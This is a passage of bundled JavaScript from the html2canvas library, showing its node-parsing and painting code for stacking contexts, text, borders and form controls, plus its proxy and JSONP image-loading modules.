                        cssClip.right - cssClip.left,
                        cssClip.bottom - cssClip.top
                ]]);
            }
            container.clip = hasParentClip(container) ? container.parent.clip.concat(clip) : clip;
            container.backgroundClip = (container.css('overflow') !== "hidden") ? container.clip.concat([container.borders.clip]) : container.clip;
            if (isPseudoElement(container)) {
                container.cleanDOM();
            }
        } else if (isTextNode(container)) {
            container.clip = hasParentClip(container) ? container.parent.clip : [];
        }
        if (!isPseudoElement(container)) {
            container.bounds = null;
        }
    }, this);
};

function hasParentClip(container) {
    return container.parent &amp;&amp; container.parent.clip.length;
}

NodeParser.prototype.asyncRenderer = function(queue, resolve, asyncTimer) {
    asyncTimer = asyncTimer || Date.now();
    this.paint(queue[this.renderIndex++]);
    if (queue.length === this.renderIndex) {
        resolve();
    } else if (asyncTimer + 20 &gt; Date.now()) {
        this.asyncRenderer(queue, resolve, asyncTimer);
    } else {
        setTimeout(bind(function() {
            this.asyncRenderer(queue, resolve);
        }, this), 0);
    }
};

NodeParser.prototype.createPseudoHideStyles = function(document) {
    this.createStyles(document, '.' + PseudoElementContainer.prototype.PSEUDO_HIDE_ELEMENT_CLASS_BEFORE + ':before { content: "" !important; display: none !important; }' +
        '.' + PseudoElementContainer.prototype.PSEUDO_HIDE_ELEMENT_CLASS_AFTER + ':after { content: "" !important; display: none !important; }');
};

NodeParser.prototype.disableAnimations = function(document) {
    this.createStyles(document, '* { -webkit-animation: none !important; -moz-animation: none !important; -o-animation: none !important; animation: none !important; ' +
        '-webkit-transition: none !important; -moz-transition: none !important; -o-transition: none !important; transition: none !important;}');
};

NodeParser.prototype.createStyles = function(document, styles) {
    var hidePseudoElements = document.createElement('style');
    hidePseudoElements.innerHTML = styles;
    document.body.appendChild(hidePseudoElements);
};

NodeParser.prototype.getPseudoElements = function(container) {
    var nodes = [[container]];
    if (container.node.nodeType === Node.ELEMENT_NODE) {
        var before = this.getPseudoElement(container, ":before");
        var after = this.getPseudoElement(container, ":after");

        if (before) {
            nodes.push(before);
        }

        if (after) {
            nodes.push(after);
        }
    }
    return flatten(nodes);
};

function toCamelCase(str) {
    return str.replace(/(\-[a-z])/g, function(match){
        return match.toUpperCase().replace('-','');
    });
}

NodeParser.prototype.getPseudoElement = function(container, type) {
    var style = container.computedStyle(type);
    if(!style || !style.content || style.content === "none" || style.content === "-moz-alt-content" || style.display === "none") {
        return null;
    }

    var content = stripQuotes(style.content);
    var isImage = content.substr(0, 3) === 'url';
    var pseudoNode = document.createElement(isImage ? 'img' : 'html2canvaspseudoelement');
    var pseudoContainer = new PseudoElementContainer(pseudoNode, container, type);

    for (var i = style.length-1; i &gt;= 0; i--) {
        var property = toCamelCase(style.item(i));
        pseudoNode.style[property] = style[property];
    }

    pseudoNode.className = PseudoElementContainer.prototype.PSEUDO_HIDE_ELEMENT_CLASS_BEFORE + " " + PseudoElementContainer.prototype.PSEUDO_HIDE_ELEMENT_CLASS_AFTER;

    if (isImage) {
        pseudoNode.src = parseBackgrounds(content)[0].args[0];
        return [pseudoContainer];
    } else {
        var text = document.createTextNode(content);
        pseudoNode.appendChild(text);
        return [pseudoContainer, new TextContainer(text, pseudoContainer)];
    }
};


NodeParser.prototype.getChildren = function(parentContainer) {
    return flatten([].filter.call(parentContainer.node.childNodes, renderableNode).map(function(node) {
        var container = [node.nodeType === Node.TEXT_NODE ? new TextContainer(node, parentContainer) : new NodeContainer(node, parentContainer)].filter(nonIgnoredElement);
        return node.nodeType === Node.ELEMENT_NODE &amp;&amp; container.length &amp;&amp; node.tagName !== "TEXTAREA" ? (container[0].isElementVisible() ? container.concat(this.getChildren(container[0])) : []) : container;
    }, this));
};

NodeParser.prototype.newStackingContext = function(container, hasOwnStacking) {
    var stack = new StackingContext(hasOwnStacking, container.getOpacity(), container.node, container.parent);
    container.cloneTo(stack);
    var parentStack = hasOwnStacking ? stack.getParentStack(this) : stack.parent.stack;
    parentStack.contexts.push(stack);
    container.stack = stack;
};

NodeParser.prototype.createStackingContexts = function() {
    this.nodes.forEach(function(container) {
        if (isElement(container) &amp;&amp; (this.isRootElement(container) || hasOpacity(container) || isPositionedForStacking(container) || this.isBodyWithTransparentRoot(container) || container.hasTransform())) {
            this.newStackingContext(container, true);
        } else if (isElement(container) &amp;&amp; ((isPositioned(container) &amp;&amp; zIndex0(container)) || isInlineBlock(container) || isFloating(container))) {
            this.newStackingContext(container, false);
        } else {
            container.assignStack(container.parent.stack);
        }
    }, this);
};

NodeParser.prototype.isBodyWithTransparentRoot = function(container) {
    return container.node.nodeName === "BODY" &amp;&amp; container.parent.color('backgroundColor').isTransparent();
};

NodeParser.prototype.isRootElement = function(container) {
    return container.parent === null;
};

NodeParser.prototype.sortStackingContexts = function(stack) {
    stack.contexts.sort(zIndexSort(stack.contexts.slice(0)));
    stack.contexts.forEach(this.sortStackingContexts, this);
};

NodeParser.prototype.parseTextBounds = function(container) {
    return function(text, index, textList) {
        if (container.parent.css("textDecoration").substr(0, 4) !== "none" || text.trim().length !== 0) {
            if (this.support.rangeBounds &amp;&amp; !container.parent.hasTransform()) {
                var offset = textList.slice(0, index).join("").length;
                return this.getRangeBounds(container.node, offset, text.length);
            } else if (container.node &amp;&amp; typeof(container.node.data) === "string") {
                var replacementNode = container.node.splitText(text.length);
                var bounds = this.getWrapperBounds(container.node, container.parent.hasTransform());
                container.node = replacementNode;
                return bounds;
            }
        } else if(!this.support.rangeBounds || container.parent.hasTransform()){
            container.node = container.node.splitText(text.length);
        }
        return {};
    };
};

NodeParser.prototype.getWrapperBounds = function(node, transform) {
    var wrapper = node.ownerDocument.createElement('html2canvaswrapper');
    var parent = node.parentNode,
        backupText = node.cloneNode(true);

    wrapper.appendChild(node.cloneNode(true));
    parent.replaceChild(wrapper, node);
    var bounds = transform ? offsetBounds(wrapper) : getBounds(wrapper);
    parent.replaceChild(backupText, wrapper);
    return bounds;
};

NodeParser.prototype.getRangeBounds = function(node, offset, length) {
    var range = this.range || (this.range = node.ownerDocument.createRange());
    range.setStart(node, offset);
    range.setEnd(node, offset + length);
    return range.getBoundingClientRect();
};

function ClearTransform() {}

NodeParser.prototype.parse = function(stack) {
    // http://www.w3.org/TR/CSS21/visuren.html#z-index
    var negativeZindex = stack.contexts.filter(negativeZIndex); // 2. the child stacking contexts with negative stack levels (most negative first).
    var descendantElements = stack.children.filter(isElement);
    var descendantNonFloats = descendantElements.filter(not(isFloating));
    var nonInlineNonPositionedDescendants = descendantNonFloats.filter(not(isPositioned)).filter(not(inlineLevel)); // 3 the in-flow, non-inline-level, non-positioned descendants.
    var nonPositionedFloats = descendantElements.filter(not(isPositioned)).filter(isFloating); // 4. the non-positioned floats.
    var inFlow = descendantNonFloats.filter(not(isPositioned)).filter(inlineLevel); // 5. the in-flow, inline-level, non-positioned descendants, including inline tables and inline blocks.
    var stackLevel0 = stack.contexts.concat(descendantNonFloats.filter(isPositioned)).filter(zIndex0); // 6. the child stacking contexts with stack level 0 and the positioned descendants with stack level 0.
    var text = stack.children.filter(isTextNode).filter(hasText);
    var positiveZindex = stack.contexts.filter(positiveZIndex); // 7. the child stacking contexts with positive stack levels (least positive first).
    negativeZindex.concat(nonInlineNonPositionedDescendants).concat(nonPositionedFloats)
        .concat(inFlow).concat(stackLevel0).concat(text).concat(positiveZindex).forEach(function(container) {
            this.renderQueue.push(container);
            if (isStackingContext(container)) {
                this.parse(container);
                this.renderQueue.push(new ClearTransform());
            }
        }, this);
};

NodeParser.prototype.paint = function(container) {
    try {
        if (container instanceof ClearTransform) {
            this.renderer.ctx.restore();
        } else if (isTextNode(container)) {
            if (isPseudoElement(container.parent)) {
                container.parent.appendToDOM();
            }
            this.paintText(container);
            if (isPseudoElement(container.parent)) {
                container.parent.cleanDOM();
            }
        } else {
            this.paintNode(container);
        }
    } catch(e) {
        log(e);
        if (this.options.strict) {
            throw e;
        }
    }
};

NodeParser.prototype.paintNode = function(container) {
    if (isStackingContext(container)) {
        this.renderer.setOpacity(container.opacity);
        this.renderer.ctx.save();
        if (container.hasTransform()) {
            this.renderer.setTransform(container.parseTransform());
        }
    }

    if (container.node.nodeName === "INPUT" &amp;&amp; container.node.type === "checkbox") {
        this.paintCheckbox(container);
    } else if (container.node.nodeName === "INPUT" &amp;&amp; container.node.type === "radio") {
        this.paintRadio(container);
    } else {
        this.paintElement(container);
    }
};

NodeParser.prototype.paintElement = function(container) {
    var bounds = container.parseBounds();
    this.renderer.clip(container.backgroundClip, function() {
        this.renderer.renderBackground(container, bounds, container.borders.borders.map(getWidth));
    }, this);

    this.renderer.clip(container.clip, function() {
        this.renderer.renderBorders(container.borders.borders);
    }, this);

    this.renderer.clip(container.backgroundClip, function() {
        switch (container.node.nodeName) {
        case "svg":
        case "IFRAME":
            var imgContainer = this.images.get(container.node);
            if (imgContainer) {
                this.renderer.renderImage(container, bounds, container.borders, imgContainer);
            } else {
                log("Error loading &lt;" + container.node.nodeName + "&gt;", container.node);
            }
            break;
        case "IMG":
            var imageContainer = this.images.get(container.node.src);
            if (imageContainer) {
                this.renderer.renderImage(container, bounds, container.borders, imageContainer);
            } else {
                log("Error loading &lt;img&gt;", container.node.src);
            }
            break;
        case "CANVAS":
            this.renderer.renderImage(container, bounds, container.borders, {image: container.node});
            break;
        case "SELECT":
        case "INPUT":
        case "TEXTAREA":
            this.paintFormValue(container);
            break;
        }
    }, this);
};

NodeParser.prototype.paintCheckbox = function(container) {
    var b = container.parseBounds();

    var size = Math.min(b.width, b.height);
    var bounds = {width: size - 1, height: size - 1, top: b.top, left: b.left};
    var r = [3, 3];
    var radius = [r, r, r, r];
    var borders = [1,1,1,1].map(function(w) {
        return {color: new Color('#A5A5A5'), width: w};
    });

    var borderPoints = calculateCurvePoints(bounds, radius, borders);

    this.renderer.clip(container.backgroundClip, function() {
        this.renderer.rectangle(bounds.left + 1, bounds.top + 1, bounds.width - 2, bounds.height - 2, new Color("#DEDEDE"));
        this.renderer.renderBorders(calculateBorders(borders, bounds, borderPoints, radius));
        if (container.node.checked) {
            this.renderer.font(new Color('#424242'), 'normal', 'normal', 'bold', (size - 3) + "px", 'arial');
            this.renderer.text("\u2714", bounds.left + size / 6, bounds.top + size - 1);
        }
    }, this);
};

NodeParser.prototype.paintRadio = function(container) {
    var bounds = container.parseBounds();

    var size = Math.min(bounds.width, bounds.height) - 2;

    this.renderer.clip(container.backgroundClip, function() {
        this.renderer.circleStroke(bounds.left + 1, bounds.top + 1, size, new Color('#DEDEDE'), 1, new Color('#A5A5A5'));
        if (container.node.checked) {
            this.renderer.circle(Math.ceil(bounds.left + size / 4) + 1, Math.ceil(bounds.top + size / 4) + 1, Math.floor(size / 2), new Color('#424242'));
        }
    }, this);
};

NodeParser.prototype.paintFormValue = function(container) {
    var value = container.getValue();
    if (value.length &gt; 0) {
        var document = container.node.ownerDocument;
        var wrapper = document.createElement('html2canvaswrapper');
        var properties = ['lineHeight', 'textAlign', 'fontFamily', 'fontWeight', 'fontSize', 'color',
            'paddingLeft', 'paddingTop', 'paddingRight', 'paddingBottom',
            'width', 'height', 'borderLeftStyle', 'borderTopStyle', 'borderLeftWidth', 'borderTopWidth',
            'boxSizing', 'whiteSpace', 'wordWrap'];

        properties.forEach(function(property) {
            try {
                wrapper.style[property] = container.css(property);
            } catch(e) {
                // Older IE has issues with "border"
                log("html2canvas: Parse: Exception caught in renderFormValue: " + e.message);
            }
        });
        var bounds = container.parseBounds();
        wrapper.style.position = "fixed";
        wrapper.style.left = bounds.left + "px";
        wrapper.style.top = bounds.top + "px";
        wrapper.textContent = value;
        document.body.appendChild(wrapper);
        this.paintText(new TextContainer(wrapper.firstChild, container));
        document.body.removeChild(wrapper);
    }
};

NodeParser.prototype.paintText = function(container) {
    container.applyTextTransform();
    var characters = punycode.ucs2.decode(container.node.data);
    var textList = (!this.options.letterRendering || noLetterSpacing(container)) &amp;&amp; !hasUnicode(container.node.data) ? getWords(characters) : characters.map(function(character) {
        return punycode.ucs2.encode([character]);
    });

    var weight = container.parent.fontWeight();
    var size = container.parent.css('fontSize');
    var family = container.parent.css('fontFamily');
    var shadows = container.parent.parseTextShadows();

    this.renderer.font(container.parent.color('color'), container.parent.css('fontStyle'), container.parent.css('fontVariant'), weight, size, family);
    if (shadows.length) {
        // TODO: support multiple text shadows
        this.renderer.fontShadow(shadows[0].color, shadows[0].offsetX, shadows[0].offsetY, shadows[0].blur);
    } else {
        this.renderer.clearShadow();
    }

    this.renderer.clip(container.parent.clip, function() {
        textList.map(this.parseTextBounds(container), this).forEach(function(bounds, index) {
            if (bounds) {
                this.renderer.text(textList[index], bounds.left, bounds.bottom);
                this.renderTextDecoration(container.parent, bounds, this.fontMetrics.getMetrics(family, size));
            }
        }, this);
    }, this);
};

NodeParser.prototype.renderTextDecoration = function(container, bounds, metrics) {
    switch(container.css("textDecoration").split(" ")[0]) {
    case "underline":
        // Draws a line at the baseline of the font
        // TODO As some browsers display the line as more than 1px if the font-size is big, need to take that into account both in position and size
        this.renderer.rectangle(bounds.left, Math.round(bounds.top + metrics.baseline + metrics.lineWidth), bounds.width, 1, container.color("color"));
        break;
    case "overline":
        this.renderer.rectangle(bounds.left, Math.round(bounds.top), bounds.width, 1, container.color("color"));
        break;
    case "line-through":
        // TODO try and find exact position for line-through
        this.renderer.rectangle(bounds.left, Math.ceil(bounds.top + metrics.middle + metrics.lineWidth), bounds.width, 1, container.color("color"));
        break;
    }
};

var borderColorTransforms = {
    inset: [
        ["darken", 0.60],
        ["darken", 0.10],
        ["darken", 0.10],
        ["darken", 0.60]
    ]
};

NodeParser.prototype.parseBorders = function(container) {
    var nodeBounds = container.parseBounds();
    var radius = getBorderRadiusData(container);
    var borders = ["Top", "Right", "Bottom", "Left"].map(function(side, index) {
        var style = container.css('border' + side + 'Style');
        var color = container.color('border' + side + 'Color');
        if (style === "inset" &amp;&amp; color.isBlack()) {
            color = new Color([255, 255, 255, color.a]); // this is wrong, but
        }
        var colorTransform = borderColorTransforms[style] ? borderColorTransforms[style][index] : null;
        return {
            width: container.cssInt('border' + side + 'Width'),
            color: colorTransform ? color[colorTransform[0]](colorTransform[1]) : color,
            args: null
        };
    });
    var borderPoints = calculateCurvePoints(nodeBounds, radius, borders);

    return {
        clip: this.parseBackgroundClip(container, borderPoints, borders, radius, nodeBounds),
        borders: calculateBorders(borders, nodeBounds, borderPoints, radius)
    };
};

function calculateBorders(borders, nodeBounds, borderPoints, radius) {
    return borders.map(function(border, borderSide) {
        if (border.width &gt; 0) {
            var bx = nodeBounds.left;
            var by = nodeBounds.top;
            var bw = nodeBounds.width;
            var bh = nodeBounds.height - (borders[2].width);

            switch(borderSide) {
            case 0:
                // top border
                bh = borders[0].width;
                border.args = drawSide({
                        c1: [bx, by],
                        c2: [bx + bw, by],
                        c3: [bx + bw - borders[1].width, by + bh],
                        c4: [bx + borders[3].width, by + bh]
                    }, radius[0], radius[1],
                    borderPoints.topLeftOuter, borderPoints.topLeftInner, borderPoints.topRightOuter, borderPoints.topRightInner);
                break;
            case 1:
                // right border
                bx = nodeBounds.left + nodeBounds.width - (borders[1].width);
                bw = borders[1].width;

                border.args = drawSide({
                        c1: [bx + bw, by],
                        c2: [bx + bw, by + bh + borders[2].width],
                        c3: [bx, by + bh],
                        c4: [bx, by + borders[0].width]
                    }, radius[1], radius[2],
                    borderPoints.topRightOuter, borderPoints.topRightInner, borderPoints.bottomRightOuter, borderPoints.bottomRightInner);
                break;
            case 2:
                // bottom border
                by = (by + nodeBounds.height) - (borders[2].width);
                bh = borders[2].width;
                border.args = drawSide({
                        c1: [bx + bw, by + bh],
                        c2: [bx, by + bh],
                        c3: [bx + borders[3].width, by],
                        c4: [bx + bw - borders[3].width, by]
                    }, radius[2], radius[3],
                    borderPoints.bottomRightOuter, borderPoints.bottomRightInner, borderPoints.bottomLeftOuter, borderPoints.bottomLeftInner);
                break;
            case 3:
                // left border
                bw = borders[3].width;
                border.args = drawSide({
                        c1: [bx, by + bh + borders[2].width],
                        c2: [bx, by],
                        c3: [bx + bw, by + borders[0].width],
                        c4: [bx + bw, by + bh]
                    }, radius[3], radius[0],
                    borderPoints.bottomLeftOuter, borderPoints.bottomLeftInner, borderPoints.topLeftOuter, borderPoints.topLeftInner);
                break;
            }
        }
        return border;
    });
}

NodeParser.prototype.parseBackgroundClip = function(container, borderPoints, borders, radius, bounds) {
    var backgroundClip = container.css('backgroundClip'),
        borderArgs = [];

    switch(backgroundClip) {
    case "content-box":
    case "padding-box":
        parseCorner(borderArgs, radius[0], radius[1], borderPoints.topLeftInner, borderPoints.topRightInner, bounds.left + borders[3].width, bounds.top + borders[0].width);
        parseCorner(borderArgs, radius[1], radius[2], borderPoints.topRightInner, borderPoints.bottomRightInner, bounds.left + bounds.width - borders[1].width, bounds.top + borders[0].width);
        parseCorner(borderArgs, radius[2], radius[3], borderPoints.bottomRightInner, borderPoints.bottomLeftInner, bounds.left + bounds.width - borders[1].width, bounds.top + bounds.height - borders[2].width);
        parseCorner(borderArgs, radius[3], radius[0], borderPoints.bottomLeftInner, borderPoints.topLeftInner, bounds.left + borders[3].width, bounds.top + bounds.height - borders[2].width);
        break;

    default:
        parseCorner(borderArgs, radius[0], radius[1], borderPoints.topLeftOuter, borderPoints.topRightOuter, bounds.left, bounds.top);
        parseCorner(borderArgs, radius[1], radius[2], borderPoints.topRightOuter, borderPoints.bottomRightOuter, bounds.left + bounds.width, bounds.top);
        parseCorner(borderArgs, radius[2], radius[3], borderPoints.bottomRightOuter, borderPoints.bottomLeftOuter, bounds.left + bounds.width, bounds.top + bounds.height);
        parseCorner(borderArgs, radius[3], radius[0], borderPoints.bottomLeftOuter, borderPoints.topLeftOuter, bounds.left, bounds.top + bounds.height);
        break;
    }

    return borderArgs;
};

function getCurvePoints(x, y, r1, r2) {
    var kappa = 4 * ((Math.sqrt(2) - 1) / 3);
    var ox = (r1) * kappa, // control point offset horizontal
        oy = (r2) * kappa, // control point offset vertical
        xm = x + r1, // x-middle
        ym = y + r2; // y-middle
    return {
        topLeft: bezierCurve({x: x, y: ym}, {x: x, y: ym - oy}, {x: xm - ox, y: y}, {x: xm, y: y}),
        topRight: bezierCurve({x: x, y: y}, {x: x + ox,y: y}, {x: xm, y: ym - oy}, {x: xm, y: ym}),
        bottomRight: bezierCurve({x: xm, y: y}, {x: xm, y: y + oy}, {x: x + ox, y: ym}, {x: x, y: ym}),
        bottomLeft: bezierCurve({x: xm, y: ym}, {x: xm - ox, y: ym}, {x: x, y: y + oy}, {x: x, y:y})
    };
}

function calculateCurvePoints(bounds, borderRadius, borders) {
    var x = bounds.left,
        y = bounds.top,
        width = bounds.width,
        height = bounds.height,

        tlh = borderRadius[0][0] &lt; width / 2 ? borderRadius[0][0] : width / 2,
        tlv = borderRadius[0][1] &lt; height / 2 ? borderRadius[0][1] : height / 2,
        trh = borderRadius[1][0] &lt; width / 2 ? borderRadius[1][0] : width / 2,
        trv = borderRadius[1][1] &lt; height / 2 ? borderRadius[1][1] : height / 2,
        brh = borderRadius[2][0] &lt; width / 2 ? borderRadius[2][0] : width / 2,
        brv = borderRadius[2][1] &lt; height / 2 ? borderRadius[2][1] : height / 2,
        blh = borderRadius[3][0] &lt; width / 2 ? borderRadius[3][0] : width / 2,
        blv = borderRadius[3][1] &lt; height / 2 ? borderRadius[3][1] : height / 2;

    var topWidth = width - trh,
        rightHeight = height - brv,
        bottomWidth = width - brh,
        leftHeight = height - blv;

    return {
        topLeftOuter: getCurvePoints(x, y, tlh, tlv).topLeft.subdivide(0.5),
        topLeftInner: getCurvePoints(x + borders[3].width, y + borders[0].width, Math.max(0, tlh - borders[3].width), Math.max(0, tlv - borders[0].width)).topLeft.subdivide(0.5),
        topRightOuter: getCurvePoints(x + topWidth, y, trh, trv).topRight.subdivide(0.5),
        topRightInner: getCurvePoints(x + Math.min(topWidth, width + borders[3].width), y + borders[0].width, (topWidth &gt; width + borders[3].width) ? 0 :trh - borders[3].width, trv - borders[0].width).topRight.subdivide(0.5),
        bottomRightOuter: getCurvePoints(x + bottomWidth, y + rightHeight, brh, brv).bottomRight.subdivide(0.5),
        bottomRightInner: getCurvePoints(x + Math.min(bottomWidth, width - borders[3].width), y + Math.min(rightHeight, height + borders[0].width), Math.max(0, brh - borders[1].width),  brv - borders[2].width).bottomRight.subdivide(0.5),
        bottomLeftOuter: getCurvePoints(x, y + leftHeight, blh, blv).bottomLeft.subdivide(0.5),
        bottomLeftInner: getCurvePoints(x + borders[3].width, y + leftHeight, Math.max(0, blh - borders[3].width), blv - borders[2].width).bottomLeft.subdivide(0.5)
    };
}

function bezierCurve(start, startControl, endControl, end) {
    var lerp = function (a, b, t) {
        return {
            x: a.x + (b.x - a.x) * t,
            y: a.y + (b.y - a.y) * t
        };
    };

    return {
        start: start,
        startControl: startControl,
        endControl: endControl,
        end: end,
        subdivide: function(t) {
            var ab = lerp(start, startControl, t),
                bc = lerp(startControl, endControl, t),
                cd = lerp(endControl, end, t),
                abbc = lerp(ab, bc, t),
                bccd = lerp(bc, cd, t),
                dest = lerp(abbc, bccd, t);
            return [bezierCurve(start, ab, abbc, dest), bezierCurve(dest, bccd, cd, end)];
        },
        curveTo: function(borderArgs) {
            borderArgs.push(["bezierCurve", startControl.x, startControl.y, endControl.x, endControl.y, end.x, end.y]);
        },
        curveToReversed: function(borderArgs) {
            borderArgs.push(["bezierCurve", endControl.x, endControl.y, startControl.x, startControl.y, start.x, start.y]);
        }
    };
}

function drawSide(borderData, radius1, radius2, outer1, inner1, outer2, inner2) {
    var borderArgs = [];

    if (radius1[0] &gt; 0 || radius1[1] &gt; 0) {
        borderArgs.push(["line", outer1[1].start.x, outer1[1].start.y]);
        outer1[1].curveTo(borderArgs);
    } else {
        borderArgs.push([ "line", borderData.c1[0], borderData.c1[1]]);
    }

    if (radius2[0] &gt; 0 || radius2[1] &gt; 0) {
        borderArgs.push(["line", outer2[0].start.x, outer2[0].start.y]);
        outer2[0].curveTo(borderArgs);
        borderArgs.push(["line", inner2[0].end.x, inner2[0].end.y]);
        inner2[0].curveToReversed(borderArgs);
    } else {
        borderArgs.push(["line", borderData.c2[0], borderData.c2[1]]);
        borderArgs.push(["line", borderData.c3[0], borderData.c3[1]]);
    }

    if (radius1[0] &gt; 0 || radius1[1] &gt; 0) {
        borderArgs.push(["line", inner1[1].end.x, inner1[1].end.y]);
        inner1[1].curveToReversed(borderArgs);
    } else {
        borderArgs.push(["line", borderData.c4[0], borderData.c4[1]]);
    }

    return borderArgs;
}

function parseCorner(borderArgs, radius1, radius2, corner1, corner2, x, y) {
    if (radius1[0] &gt; 0 || radius1[1] &gt; 0) {
        borderArgs.push(["line", corner1[0].start.x, corner1[0].start.y]);
        corner1[0].curveTo(borderArgs);
        corner1[1].curveTo(borderArgs);
    } else {
        borderArgs.push(["line", x, y]);
    }

    if (radius2[0] &gt; 0 || radius2[1] &gt; 0) {
        borderArgs.push(["line", corner2[0].start.x, corner2[0].start.y]);
    }
}

function negativeZIndex(container) {
    return container.cssInt("zIndex") &lt; 0;
}

function positiveZIndex(container) {
    return container.cssInt("zIndex") &gt; 0;
}

function zIndex0(container) {
    return container.cssInt("zIndex") === 0;
}

function inlineLevel(container) {
    return ["inline", "inline-block", "inline-table"].indexOf(container.css("display")) !== -1;
}

function isStackingContext(container) {
    return (container instanceof StackingContext);
}

function hasText(container) {
    return container.node.data.trim().length &gt; 0;
}

function noLetterSpacing(container) {
    return (/^(normal|none|0px)$/.test(container.parent.css("letterSpacing")));
}

function getBorderRadiusData(container) {
    return ["TopLeft", "TopRight", "BottomRight", "BottomLeft"].map(function(side) {
        var value = container.css('border' + side + 'Radius');
        var arr = value.split(" ");
        if (arr.length &lt;= 1) {
            arr[1] = arr[0];
        }
        return arr.map(asInt);
    });
}

function renderableNode(node) {
    return (node.nodeType === Node.TEXT_NODE || node.nodeType === Node.ELEMENT_NODE);
}

function isPositionedForStacking(container) {
    var position = container.css("position");
    var zIndex = (["absolute", "relative", "fixed"].indexOf(position) !== -1) ? container.css("zIndex") : "auto";
    return zIndex !== "auto";
}

function isPositioned(container) {
    return container.css("position") !== "static";
}

function isFloating(container) {
    return container.css("float") !== "none";
}

function isInlineBlock(container) {
    return ["inline-block", "inline-table"].indexOf(container.css("display")) !== -1;
}

function not(callback) {
    var context = this;
    return function() {
        return !callback.apply(context, arguments);
    };
}

function isElement(container) {
    return container.node.nodeType === Node.ELEMENT_NODE;
}

function isPseudoElement(container) {
    return container.isPseudoElement === true;
}

function isTextNode(container) {
    return container.node.nodeType === Node.TEXT_NODE;
}

function zIndexSort(contexts) {
    return function(a, b) {
        return (a.cssInt("zIndex") + (contexts.indexOf(a) / contexts.length)) - (b.cssInt("zIndex") + (contexts.indexOf(b) / contexts.length));
    };
}

function hasOpacity(container) {
    return container.getOpacity() &lt; 1;
}

function asInt(value) {
    return parseInt(value, 10);
}

function getWidth(border) {
    return border.width;
}

function nonIgnoredElement(nodeContainer) {
    return (nodeContainer.node.nodeType !== Node.ELEMENT_NODE || ["SCRIPT", "HEAD", "TITLE", "OBJECT", "BR", "OPTION"].indexOf(nodeContainer.node.nodeName) === -1);
}

function flatten(arrays) {
    return [].concat.apply([], arrays);
}

function stripQuotes(content) {
    var first = content.substr(0, 1);
    return (first === content.substr(content.length - 1) &amp;&amp; first.match(/'|"/)) ? content.substr(1, content.length - 2) : content;
}

function getWords(characters) {
    var words = [], i = 0, onWordBoundary = false, word;
    while(characters.length) {
        if (isWordBoundary(characters[i]) === onWordBoundary) {
            word = characters.splice(0, i);
            if (word.length) {
                words.push(punycode.ucs2.encode(word));
            }
            onWordBoundary =! onWordBoundary;
            i = 0;
        } else {
            i++;
        }

        if (i &gt;= characters.length) {
            word = characters.splice(0, i);
            if (word.length) {
                words.push(punycode.ucs2.encode(word));
            }
        }
    }
    return words;
}

function isWordBoundary(characterCode) {
    return [
        32, // &lt;space&gt;
        13, // \r
        10, // \n
        9, // \t
        45 // -
    ].indexOf(characterCode) !== -1;
}

function hasUnicode(string) {
    return (/[^\u0000-\u00ff]/).test(string);
}

module.exports = NodeParser;

},{"./color":3,"./fontmetrics":7,"./log":13,"./nodecontainer":14,"./pseudoelementcontainer":18,"./stackingcontext":21,"./textcontainer":25,"./utils":26,"punycode":1}],16:[function(_dereq_,module,exports){
var XHR = _dereq_('./xhr');
var utils = _dereq_('./utils');
var log = _dereq_('./log');
var createWindowClone = _dereq_('./clone');
var decode64 = utils.decode64;

function Proxy(src, proxyUrl, document) {
    var supportsCORS = ('withCredentials' in new XMLHttpRequest());
    if (!proxyUrl) {
        return Promise.reject("No proxy configured");
    }
    var callback = createCallback(supportsCORS);
    var url = createProxyUrl(proxyUrl, src, callback);

    return supportsCORS ? XHR(url) : (jsonp(document, url, callback).then(function(response) {
        return decode64(response.content);
    }));
}
var proxyCount = 0;

function ProxyURL(src, proxyUrl, document) {
    var supportsCORSImage = ('crossOrigin' in new Image());
    var callback = createCallback(supportsCORSImage);
    var url = createProxyUrl(proxyUrl, src, callback);
    return (supportsCORSImage ? Promise.resolve(url) : jsonp(document, url, callback).then(function(response) {
        return "data:" + response.type + ";base64," + response.content;
    }));
}

function jsonp(document, url, callback) {
    return new Promise(function(resolve, reject) {
        var s = document.createElement("script");
        var cleanup = function() {
            delete window.html2canvas.proxy[callback];
            document.body.removeChild(s);
        };
        window.html2canvas.proxy[callback] = function(response) {
            cleanup();
            resolve(response);
        };
        s.src = url;
        s.onerror = function(e) {
            cleanup();
            reject(e);
        };
        document.body.appendChild(s);
    });
}

function createCallback(useCORS) {
    return !useCORS ? "html2canvas_" + Date.now() + "_" + (++proxyCount) + "_" + Math.round(Math.random() * 100000) : "";
}

function createProxyUrl(proxyUrl, src, callback) {
    return proxyUrl + "?url=" + encodeURIComponent(src) + (callback.length ? "&amp;callback=html2canvas.proxy." + callback : "");
}

function documentFromHTML(src) {
    return function(html) {
        var parser = new DOMParser(), doc;
        try {
            doc = parser.parseFromString(html, "text/html");
        } catch(e) {
            log("DOMParser not supported, falling back to createHTMLDocument");
            doc = document.implementation.createHTMLDocument("");
            try {
                doc.open();
                doc.write(html);
                doc.close();
            } catch(ee) {
                log("createHTMLDocument write not supported, falling back to document.body.innerHTML");
                doc.body.innerHTML = html; // ie9 doesnt support writing to documentElement
            }
        }

        var b = doc.querySelector("base");
        if (!b || !b.href.host) {
            var base = doc.createElement("base");
            base.href = src;
            doc.head.insertBefore(base, doc.head.firstChild);
        }

        return doc;
    };
}

function loadUrlDocument(src, proxy, document, width, height, options) {
    return new Proxy(src, proxy, window.document).then(documentFromHTML(src)).then(function(doc) {
        return createWindowClone(doc, document, width, height, options, 0, 0);
    });
}

exports.Proxy = Proxy;
exports.ProxyURL = ProxyURL;
exports.loadUrlDocument = loadUrlDocument;

},{"./clone":2,"./log":13,"./utils":26,"./xhr":28}],17:[function(_dereq_,module,exports){
var ProxyURL = _dereq_('./proxy').ProxyURL;

function ProxyImageContainer(src, proxy) {
    var link = document.createElement("a");
    link.href = src;
    src = link.href;
    this.src = src;
    this.image = new Image();
    var self = this;
    this.promise = new Promise(function(resolve, reject) {
        self.image.crossOrigin = "Anonymous";
        self.image.onload = resolve;
        self.image.onerror = reject;

        new ProxyURL(src, proxy, document).then(function(url) {
            self.image.src = url;
        })['catch'](reject);
    });
}

module.exports = ProxyImageContainer;

},{"./proxy":16}],18:[function(_dereq_,module,exports){
var NodeContainer = _dereq_('./nodecontainer');

function PseudoElementContainer(node, parent, type) {
    NodeContainer.call(this, node, parent);
    this.isPseudoElement = true;
    this.before = type === ":before";
}

PseudoElementContainer.prototype.cloneTo = function(stack) {
    PseudoElementContainer.prototype.cloneTo.call(this, stack);
    stack.isPseudoElement = true;
    stack.before = this.before;
};

